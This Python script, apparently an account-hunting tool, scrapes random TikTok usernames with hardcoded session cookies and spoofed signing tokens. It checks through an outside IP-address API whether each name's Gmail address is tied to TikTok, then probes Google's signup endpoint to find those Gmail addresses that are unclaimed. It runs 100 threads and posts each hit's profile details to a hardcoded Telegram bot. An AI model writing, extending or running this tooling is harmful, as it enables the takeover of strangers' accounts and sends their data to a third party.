
from requests import Session
import secrets
import uuid
import time
from MedoSigner import Argus, Gorgon, md5, Ladon
from urllib.parse import urlencode
import requests
import random
from uuid import uuid4
import requests
import os
from user_agent import *
import http.client
import re
from random import randrange,choice,randint
from threading import Thread
from ms4 import InfoTik
import requests
import threading
import string
import random
import os
import binascii
from requests import post as pp
from user_agent import generate_user_agent as ggb
from random import choice as cc
from random import randrange as rr
import requests

import httpx
import random
import uuid
import time
import secrets
from urllib.parse import urlencode
from MedoSigner import Argus, Gorgon, md5, Ladon
import binascii
import os
from concurrent.futures import ThreadPoolExecutor

from requests import Session
import secrets
import uuid
import time
from MedoSigner import Argus, Gorgon, md5, Ladon
from urllib.parse import urlencode
import requests
import random
from uuid import uuid4
import requests
import os
from user_agent import *
import http.client
import re
from random import randrange,choice,randint
from threading import Thread
from ms4 import InfoTik

import webbrowser
#webbrowser.open("https://t.me/thomastool")
logo = ("logo")


print("\x1b[1;39m—" * 60)
print(logo)

os.system('clear')



K = '\033[1;31m'
Y = '\033[1;32m'
S = '\033[1;33m'
M = '\033[1;36m'
X = '\033[1;35m'
W = '\033[1;37m'




badgmail = 0
badtik = 0
goodtik = 0
hits = 0
URL = "http://95.211.253.105:1337/newapiscrazyshit2007"
HEADERS = {
    'Host': "95.211.253.105:1337",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)",
    'Accept-Encoding': "gzip, deflate"
}
THREADS = 100



def info(userr):
    tiko = InfoTik.TikTok_Info(userr)

    if tiko.get('status') == 'bad':
        print(' - Bad Username ..!')
        return

    # Extracting information with default values
    Name = tiko.get('name', 0)
    Followers = tiko.get('followers', 0)
    Following = tiko.get('following', 0)
    Like = tiko.get('like', 0)
    Video = tiko.get('video', 0)
    Flag = tiko.get('flag', 0)
    Country = tiko.get('country', 0)
    Date = tiko.get('Date', 0)
    Id = tiko.get('id', 0)
    Bio = tiko.get('bio', 0)

    # Formatting the output
    ff = f"""
    𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝑇𝐼𝐾𝑇𝑂𝐾 𓊇
    🇹🇷 Name: {Name}
    🇹🇷 Username: {userr}
    🇹🇷 Gmail: {userr}@gmail.com
    🇹🇷 Followers: {Followers}
    🇹🇷 following: {Following}
    🇹🇷 Likes: {Like}
    🇹🇷 Videos: {Video}
    🇹🇷 Flag: {Flag}
    🇹🇷 Country: {Country}
    🇹🇷 Date: {Date}
    🇹🇷 Id: {Id}
    🇹🇷 Bio: {Bio}
    """
    requests.post(f"https://api.telegram.org/bot7692008999:AAGF4qgkNpUYeadSZ5qI5XxxfV_cEgmKd4k/sendMessage?chat_id=6762002309&text={ff}")

    print(ff)
yy = 'azertyuiopmlkjhgfdsqwxcvbn' 
def tll():
    try:
        n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
        n2 = ''.join(cc(yy) for i in range(rr(3, 9)))
        host = ''.join(cc(yy) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            'user-agent': str(ggb()),
        }
        res1 = requests.get(
            'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', 
            headers=he3
        )
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {
            '__Host-GAPS': host
        }
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': ggb(),
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open('tl.txt', 'w') as f:
            f.write(f'{tl}//{host}\n')
    except Exception as e:
        print(e)
        tll()
tll()
   
    

def play():
	
	
	
	os.system('clear' if os.name =='posix' else 'cls')
	print(f''' \x1b[1;32m o    Hit \033[1;34m  : \033[1;37m{hits} ~  \033[1;31mKōtü \033[1;34m: \033[1;37m{badtik} ~  \033[1;33mOrta Mail \033[1;34m: \033[1;37m{badgmail}  \x1b[1;32m''')

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
    if not unix:
        unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(
            params,
            x_ss_stub,
            unix,
            platform=platform,
            aid=aid,
            license_id=license_id,
            sec_device_id=sec_device_id,
            sdk_version=sdk_version_str,
            sdk_version_int=sdk_version,
        ),
    }



def check2(email):
    global goodtik, badtik



    response = requests.get(URL, params={'email': email}, headers=HEADERS, timeout=5)
    if '"status":"registered"' in response.text:
        goodtik += 1
        play()
        gmm(email)
    else:
        badtik += 1
        play()


yy = 'azertyuiopmlkjhgfdsqwxcvbn'

def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': ggb(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)
  
def gmm(email):
          global hits,badgmail
      
        
          if 'good' == check_gmail(email):
            
            hits+=1
            play()
            userr = email.split('@')[0]
            
            info(userr)
          else:
            badgmail+=1
            play()
            
print("\x1b[1;39m—" * 60)
logo2 = ('TikTok')
print(logo2)

print(" \x1b[1;32m 1. Random Follower [ Best ✅ ]   " )   
print(" \x1b[1;32m 2. 100+ Follower [ middle ✅ ] " )   
print("\x1b[1;39m—" * 60)
iko = input(' - Your choice : ')
        
def rrandom():
 while True:
  try:
    keyword = ''.join(random.choice('123456780') for _ in range(10))
    kill = random.choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )        		


      
    key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
    rng = int("".join(random.choice("6789") for _ in range(1)))
        
    name = "".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(rng))
    usery = random.choice([name, key])      	
    he3 = {
        'User-Agent': "com.zhiliaoapp.musically/2022509040 (Linux; U; Android 12; ar; TECNO BF6; Build/SP1A.210812.001; Cronet/TTNetVersion:ae513f3c 2022-08-08 QuicVersion:12a1d5c5 2022-06-27)",
    }
    
    ttwid = requests.get('https://www.tiktok.com/', headers=he3).cookies.get_dict().get('ttwid', '')
    
    zaid = requests.get(
            'https://www.tiktok.com/api/search/user/full/',
            headers=he3,
            params={
                'aid': '1988',
                'keyword': 'zaid' ,
                'app_name': 'tiktok_web',
                'region': 'IQ',
                'msToken':'qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh'
            }
        )
    
    msToken = zaid.cookies.get_dict().get('msToken', '')

    params = {
        '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
        'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD'
    }
    
    ses = str(uuid4()).replace('-', '')
    cookies = {
            
            'cookie': f'''passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid=''' + ttwid + '; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken=' + msToken + '; msToken=' + msToken + '; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt' }
    url = f'''https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&keyword={usery}'''
    response = requests.get(url, params=params, headers=he3, cookies=cookies).json()
    
    for users in response.get('user_list', []):
        user = users['user_info']['unique_id']
        if '_' in user:
                pass
        
        if iko == '1':
          email = user + '@gmail.com'
          check2(email)
        elif iko == '2':
           fol = users['user_info']['follower_count']
           if int(fol) >= 100:
            email = user + '@gmail.com'
            check2(email)
        else:
        	print(' vip ');exit()
  except:''
def main():
    print("[*] Starting API Spammer with 100 Threads...")
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=rrandom, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
main()